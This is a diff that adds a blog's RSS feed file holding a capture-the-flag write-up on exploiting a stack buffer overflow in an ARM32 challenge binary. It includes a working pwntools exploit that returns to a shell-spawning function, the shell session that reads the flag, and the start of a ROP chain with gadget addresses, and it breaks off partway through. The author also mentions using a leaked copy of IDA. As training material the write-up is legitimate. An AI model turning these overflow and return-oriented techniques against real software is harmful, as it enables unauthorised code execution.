@@ -1,0 +1,228 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Linux on yocvito website</title>
+    <link>//localhost:1313/tags/linux/</link>
+    <description>Recent content in Linux on yocvito website</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Tue, 29 Oct 2024 15:17:22 +0100</lastBuildDate><atom:link href="//localhost:1313/tags/linux/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>PWN: Basic ARM Stack Buffer Overflow</title>
+      <link>//localhost:1313/posts/pwn_hackropole-armory/</link>
+      <pubDate>Tue, 29 Oct 2024 15:17:22 +0100</pubDate>
+      
+      <guid>//localhost:1313/posts/pwn_hackropole-armory/</guid>
+      <description>&lt;h1 id=&#34;pwn-hackropole---armory&#34;&gt;PWN: Hackropole - Armory&lt;/h1&gt;
+&lt;p&gt;This is challenge for training basic buffer overflows on ARM architecture. It was found on the &lt;a href=&#34;https://hackropole.fr/fr/challenges/pwn/fcsc2019-pwn-armory/&#34;&gt;Hackropole&lt;/a&gt; website.&lt;/p&gt;
+&lt;h2 id=&#34;challenge-description&#34;&gt;Challenge Description&lt;/h2&gt;
+&lt;p&gt;You have a docker container running the challenge binary on &lt;code&gt;localhost:4000&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;When you connect to it with a network utility like &lt;code&gt;socat&lt;/code&gt;, you can see it ask for an input name and then display an hello message.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ socat tcp:localhost:4000 -
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Hello, what&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;s your name?
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Hello user!
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The binary running is an ARM32 ELF executable.&lt;/p&gt;</description>
+      <content>&lt;h1 id=&#34;pwn-hackropole---armory&#34;&gt;PWN: Hackropole - Armory&lt;/h1&gt;
+&lt;p&gt;This is challenge for training basic buffer overflows on ARM architecture. It was found on the &lt;a href=&#34;https://hackropole.fr/fr/challenges/pwn/fcsc2019-pwn-armory/&#34;&gt;Hackropole&lt;/a&gt; website.&lt;/p&gt;
+&lt;h2 id=&#34;challenge-description&#34;&gt;Challenge Description&lt;/h2&gt;
+&lt;p&gt;You have a docker container running the challenge binary on &lt;code&gt;localhost:4000&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;When you connect to it with a network utility like &lt;code&gt;socat&lt;/code&gt;, you can see it ask for an input name and then display an hello message.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ socat tcp:localhost:4000 -
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Hello, what&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;s your name?
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Hello user!
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The binary running is an ARM32 ELF executable.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ file armory
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;armory: ELF 32-bit LSB executable, ARM, EABI5 version &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SYSV&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib/ld-linux.so.3, &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; GNU/Linux 3.2.0, BuildID&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;sha1&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;aaa2d5ba6d3a6cf3958eb9073e673795c2f1e24e, not stripped
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can look at the binary protections with &lt;code&gt;checksec&lt;/code&gt; from &lt;code&gt;pwntools&lt;/code&gt; suite.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ checksec armory
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/path/to/armory&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Arch:       arm-32-little
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    RELRO:      Full RELRO
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Stack:      No canary found
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    NX:         NX enabled
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    PIE:        No PIE &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x10000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Stripped:   No
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The binary has not actual protection other than &lt;code&gt;NX&lt;/code&gt; or &lt;code&gt;RELRO&lt;/code&gt;, meaning we cannot perform shellcode injection nor GOT overwrite.&lt;/p&gt;
+&lt;h2 id=&#34;analysis&#34;&gt;Analysis&lt;/h2&gt;
+&lt;p&gt;We analyze the binary with IDA Pro (I&amp;rsquo;m using the IDA 9 leak you can find on internet archive).&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;main&lt;/code&gt; function is quite simple, it reads a name from the user and then prints a message.&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;main function&#34; src=&#34;//localhost:1313/img/pwn-hackropole_armory/main.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;scanf&lt;/code&gt; call on line 7 doesn&amp;rsquo;t bound the size of the retrieved input, allowing the user to inject more bytes than the &lt;code&gt;input&lt;/code&gt; buffer can hold. Causing a buffer overflow and potentially allowing to execute arbitrary code.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;It could have been avoided by using &lt;code&gt;scanf(&amp;quot;%63s&amp;quot;, input)&lt;/code&gt; which limit the number of written bytes.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;In order to exploit this code, we want to redirect the program execution and spawn a shell. To do so, we need to control the return address of the function and make it point to malicious code.&lt;/p&gt;
+&lt;p&gt;When the &lt;code&gt;main&lt;/code&gt; function returns, the &lt;code&gt;LR&lt;/code&gt; register will contains our own crafted address, eventually executing attacker controlled code.&lt;/p&gt;
+&lt;p&gt;As we cannot directly inject shellcode, the idea is to either find a function in the binary that can be control to spawn a shell or use a &lt;strong&gt;ROPChain&lt;/strong&gt; to call &lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Luckily, the binary contains an &lt;code&gt;evil&lt;/code&gt; function spawning a shell. We know the binary hasn&amp;rsquo;t &lt;code&gt;PIE&lt;/code&gt; enabled, thus we can directly call this function without needing a leak from the program.&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;evil function&#34; src=&#34;//localhost:1313/img/pwn-hackropole_armory/evil.png&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
+&lt;p&gt;We have found a vulnerability in the binary and now we want to exploit it. We already have unveiled the &lt;code&gt;evil&lt;/code&gt; function that spawns a shell and will craft an exploit to call it.&lt;/p&gt;
+&lt;p&gt;We first need to find the offset between the &lt;code&gt;input&lt;/code&gt; buffer start and the return address. In the disassembly view above, we can look at the function prologue to discover this.&lt;/p&gt;
+&lt;p&gt;The function is pushing &lt;code&gt;FP&lt;/code&gt; and &lt;code&gt;LR&lt;/code&gt; registers on the stack and then allocates 0x40 (64) bytes. Thus the offset from &lt;code&gt;input&lt;/code&gt; to &lt;code&gt;LR&lt;/code&gt; is 0x44 (68).&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Remember order of &lt;code&gt;PUSH&lt;/code&gt; instruction when loading mutliple values onto the stack. The most significant register (right) is pushed first.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Stack Layout of main:&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0xffff:   LR            &amp;lt;-- FP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0xfffb:   FP    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0xfff8:   input[60:64]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0xffbb:   input[0:4]    &amp;lt;-- SP
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can now craft the exploit code for interacting with the binary. We will use &lt;code&gt;pwntools&lt;/code&gt; to connect to the remote port, craft and send the payload.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; argparse
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil_ea &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0001052c&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    parser &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; argparse&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ArgumentParser()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    parser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_argument(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;, help&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;The host to connect to&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    parser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_argument(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;port&amp;#34;&lt;/span&gt;, help&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;The port to connect to&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    args &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; parser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;parse_args()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;host, args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;port)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x44&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p32(evil_ea))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;By running the exploit script, we can see the exploitation was successful.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 exploit.py localhost &lt;span style=&#34;color:#ae81ff&#34;&gt;4000&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Opening connection to localhost on port 4000: Done
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Switching to interactive mode
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Hello, what&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;s your name?
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;05&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;01!
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ctf
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ls -la
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;total &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt; .
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Oct &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; 07:52 ..
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-r-x------ &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; ctf  ctf  &lt;span style=&#34;color:#ae81ff&#34;&gt;8316&lt;/span&gt; Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt; armory
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-r-------- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; ctf  ctf    &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt; Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt; flag
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-r-x------ &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; ctf  ctf    &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt; Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2023&lt;/span&gt; run.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cat flag
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ECSC&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;__REDACTED__&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We are now very happy to got it work, but we did not really improved our ARM skills here&amp;hellip;
+Thus we will try to exploit it using ROP to mess a bit more with ARM exploitation.&lt;/p&gt;
+&lt;h3 id=&#34;ropchain-based-exploit&#34;&gt;ROPChain based exploit&lt;/h3&gt;
+&lt;p&gt;What we need is to contruct a ROPChain (look at &lt;a href=&#34;http://phrack.org/issues/58/4.html#article&#34;&gt;this&lt;/a&gt; if you don&amp;rsquo;t know about ROPs). The binary isn&amp;rsquo;t designed to be exploited using ROP thus the CTF author didn&amp;rsquo;t put specific gadgets in the binary. It will be a bit more difficult to chain gadgets for calling &lt;code&gt;system(&amp;quot;/bin/dash&amp;quot;)&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;In order to call a function using &lt;strong&gt;ret-2-libc&lt;/strong&gt;, we need to set up the CPU registers as if the function was called normally, and finally return to the function.&lt;/p&gt;
+&lt;p&gt;Our target function is &lt;code&gt;system&lt;/code&gt; which takes 1 argument, a pointer to a string representing the command to run. In ARM32, arguments are passed through registers &lt;code&gt;R0-R3&lt;/code&gt;  and then onto the stack. So if we can set the &lt;code&gt;R0&lt;/code&gt; register to the address of the string &lt;code&gt;/bin/dash&lt;/code&gt; and then makes &lt;code&gt;LR&lt;/code&gt; points to the &lt;code&gt;system&lt;/code&gt; function, we can spawn a shell.&lt;/p&gt;
+&lt;p&gt;Our ROPChain should look like:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;+0:   @pop_r0_lr   &amp;lt;-- LR (when returning from main)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;+4:   @bin_sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;+8:   @system
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;finding-relevant-gadgets&#34;&gt;Finding relevant gadgets&lt;/h4&gt;
+&lt;p&gt;We can enumerate the binary gadgets using &lt;code&gt;ROPgadget&lt;/code&gt; (output has been reduced for clarity):&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ROPgadget --binary&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;armory
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Gadgets information
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x00010530 : add fp, sp, &lt;span style=&#34;color:#75715e&#34;&gt;#4 ; ldr r3, [pc, #0x18] ; add r3, pc, r3 ; mov r0, r3 ; bl #0x103cc ; mov r0, r0 ; sub sp, fp, #4 ; pop {fp, lr} ; bx lr&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x0001049c : add r1, r1, r1, lsr &lt;span style=&#34;color:#75715e&#34;&gt;#31 ; asrs r1, r1, #1 ; bxeq lr ; ldr r3, [pc, #0x10] ; cmp r3, #0 ; bxeq lr ; bx r3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x00010380 : pop &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;r3, lr&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; ; bx lr
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x000105b8 : mov r0, r3 ; sub sp, fp, &lt;span style=&#34;color:#75715e&#34;&gt;#4 ; pop {fp, lr} ; bx lr&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x00010464 : sub r3, r3, r0 ; cmp r3, &lt;span style=&#34;color:#75715e&#34;&gt;#6 ; bxls lr ; ldr r3, [pc, #0x10] ; cmp r3, #0 ; bxeq lr ; bx r3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x00010548 : sub sp, fp, &lt;span style=&#34;color:#75715e&#34;&gt;#4 ; pop {fp, lr} ; bx lr&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Unique gadgets found: &lt;span style=&#34;color:#ae81ff&#34;&gt;94&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There is no obvious gadgets for setting up &lt;code&gt;r0&lt;/code&gt; to what we want. We can eventually branch &lt;code&gt;0x00010380 : pop {r3, lr} ; bx lr&lt;/code&gt; with &lt;code&gt;0x000105b8 : mov r0, r3 ; sub sp, fp, #4 ; pop {fp, lr} ; bx lr&lt;/code&gt; but &lt;code&gt;sp&lt;/code&gt; is modified and thus, the stack layout will be undefined, making our exploit potentially fail.&lt;/p&gt;
+&lt;p&gt;What we can still do to demonstrate ROP on ARM is, using the gadget that call &lt;code&gt;system&lt;/code&gt; in the &lt;code&gt;evil&lt;/code&gt; function, discard the loading of the &lt;code&gt;&amp;quot;/bin/dash&amp;quot;&lt;/code&gt; string into &lt;code&gt;r3&lt;/code&gt; and use the gadget at &lt;code&gt;0x10380&lt;/code&gt; to load it manually with ROP.&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;evil function dissasembly&#34; src=&#34;//localhost:1313/img/pwn-hackropole_armory/evil-disass.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Our ROPChain will then look like:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;+0: 0x00010380  ; @g_mov_r0_r3
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;+4: 0x00010650  ; @/bin/dash (retrieved in IDA)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;+8: 0x0001053C  ; @evil_system_stub
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
